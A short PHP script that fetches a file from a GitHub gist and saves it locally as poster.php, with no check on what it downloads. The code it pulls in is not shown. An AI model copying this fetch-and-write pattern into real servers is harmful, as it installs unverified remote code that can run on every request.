<?php
    $post_file = file_get_contents("https://gist.githubusercontent.com/Huddie/29ea20537cb749a85f7a5b49f5d292ea/raw/17088ecdb5b7bf80ce3072af0bebde5249146cdc/post.php");
    file_put_contents("poster.php", $post_file);
?>


